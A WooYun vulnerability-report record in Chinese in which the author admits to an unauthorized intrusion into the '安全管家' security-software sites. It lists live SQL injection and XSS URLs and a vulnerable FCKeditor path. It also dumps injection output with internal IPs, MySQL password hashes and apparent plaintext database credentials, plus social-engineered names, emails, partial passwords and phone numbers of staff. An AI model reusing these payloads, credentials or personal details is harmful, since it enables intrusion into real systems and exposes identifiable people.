{"id": 15618, "wybug_id": "wooyun-2012-014415", "wybug_title": "安全管家主站+子站root注入遇到数据库服务器+XSS+社工杀进邮箱和后台", "wybug_corp": "安全管家", "wybug_author": "Seay", "wybug_date": "2012-11-06 12:02", "wybug_open_date": "2012-12-21 12:03", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高", "字符类型注射", "管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-11-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-11-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-12-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-21：\t细节向公众公开  简要描述： 首先对安全管家道歉：在未经授权的情况下对安全管家站点进行渗透测试，过程中用到社工，利用得到的数据登陆邮箱和多个后台，对不住了，对不住+n(对不住)....感谢好基友Snow。祝自己在两个月离校后，找到好工作，年后工作顺利。 详细说明：  不一一道来测试过程了，给出得到的数据，为了此漏洞公开后不影响安全管家部分人员的隐私，密码和手机号等敏感信息部分以星号代替。三处root注入：http://m.aqgj.cn/wap/?a=header&from=&h=5&t=x&mcid=10http://m.aqgj.cn/wap/?m=Soft&t=x&mid=103&stid=13http://www.anguanjia.com/index.php?c=android&a=android_info&act=m&pname=1401http://m.aqgj.cn/admin/index.php/Public/login  后台http://aapp.aqgj.cn/m/fckeditor/editor/fckeditor.html  php 2.6版本fckeditor编辑器未处理，2.6.4以下版本有个任意文件上传XSS:http://www.aqgj.cn/?c=android&act=--%3E%27%22%3E%3Cscript%3Ealert%28/seay/%29%3C/script%3E社工得到的信息：\n赵岗rainswallow\tRain**\ti@morbe.comRain**E5Email：i@morbe.com、rainswallow@263.net、Rebel.Zhao@gmail.com/6052077@qq.comwhios:anquanguanjia.com\trainswallow@263.net\trainswallow\tRain**\ti@morbe.comhttp://www.1tpan.com/i@morbe.com\tRain**\n服务器管理员\nstoneslshiEmail：stoneslshi@163.com、shilei@anguanjia.compass:82**17/stone**shi/管理：sunjie@morbe.com;> 赵岗> 手机：139108372**叶纪平手机: 1870101800**谢滋TEL：151200726**-------------------------------------------------------------------------------------bbs:tangcan\t\tstones**hi--------------------------------------------------------------------------------------web:admin\truan**e2610---------------------------------------------------------------------------------------mysql:repl\treplroot\tmqq2009dbuser\tsoftdb123---------------------------------------------------------------------------------------\n注入得到的信息：\nTarget: \t\thttp://m.aqgj.cn/wap/?a=header&from=&h=5&t=x&mcid=10Host IP:\t\t117.135.130.111Web Server: \tnginx/0.9.3Powered-by: \tPHP/5.3.10DB Server: \tMySQLResp. Time(avg):\t187 msCurrent User: \tdbuser@10.147.21.30Sql Version: \t5.0.51a-logCurrent DB: \twapSystem User: \tdbuser@10.147.21.30Host Name: \t21_18Installation dir: \t/usr/local/app/mysql-linux/DB User & Pass: \troot::localhost\t\troot::21_18\t\troot::127.0.0.1\t\t::localhost\t\t::21_18\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:172.23.%\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:172.25.%\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:172.27.%\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.161.%\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.130.%\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.147.%\t\trepl:*A424E797037BF97C19A2E88CF7891C5C2038C039:10.147.%\t\tdbuser:*8A47F8BB72BDAFAB6BD74D0A984DABE184C19915:%Data Bases: \tinformation_schema\t\taqgj\t\tmysql\t\tnwww\t\tscandb\t\tsoftdb\t\ttest\t\tucdb\t\tuser\t\twap\t\twww\t\tx2Target: \t\thttp://www.anguanjia.com/index.php?c=android&a=android_info&act=m&pname=1401Host IP:\t\t211.162.209.90Web Server: \tnginx/0.9.3Powered-by: \tPHP/5.3.10DB Server: \tMySQL >=5Resp. Time(avg):\t256 msCurrent User: \tdbuser@10.147.21.12Sql Version: \t5.0.51a-logCurrent DB: \tsoftdbmSystem User: \tdbuser@10.147.21.12Host Name: \t20_76Installation dir: \t/usr/local/app/mysql-linux/DB User & Pass: \troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:localhost\t\troot::20_76\t\troot::127.0.0.1\t\t::localhost\t\t::20_76\t\trepl:*A424E797037BF97C19A2E88CF7891C5C2038C039:10.147.19.237\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.147.19.237\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.147.20.76\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.147.20.80\t\troot:*1FEF85324A865F1E4370692C04F76CA2A013CD47:10.147.20.79\t\tdbuser:*8A47F8BB72BDAFAB6BD74D0A984DABE184C19915:*\t\tdbuser:*8A47F8BB72BDAFAB6BD74D0A984DABE184C19915:%\t\troot:*0BAAC73C3E8A726A89A9C282B1444736CE2569C4:10.147.20.81Data Bases: \tinformation_schema\t\tbackupdb\t\tcloudscandb\t\tcloudtj\t\tmysql\t\tsoftdbi\t\tsoftdbm\t\ttest\n   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  再次对安全管家说声对不住，请原谅此次的未授权测试。修复下注入。尽快修改下以前用到的密码。数据库连接尽量不要用root权限。顺便求礼物鼓励，感谢安全管家。   版权声明：转载请注明来源 Seay@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-11-06 13:24 厂商回复： 收到，已经在处理 最新状态： 2012-11-14：已经处理完毕，消除漏洞 2012-11-14：已经处理完毕，消除漏洞  ", "replys": "漏洞评价：\n评论\n     2012-11-06 12:41 |    \t\tSunshine \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:10        | Nothing.)\t\t \n  你这是找工作么？？？    \n     2012-11-06 13:10 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  @Seay，师弟，又在搞什么？,已经耐不住寂寞了    \n     2012-11-06 18:04 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  @Sunshine 有推荐么    \n     2012-11-06 18:04 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  @shack2 耐不住寂寞，把你菊花贡献出来    \n     2012-11-06 18:37 |    \t\tSunshine \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:10        | Nothing.)\t\t \n  找@风萧萧     \n     2012-11-06 20:50 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  @Sunshine 还不急，再努力两个月吧    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}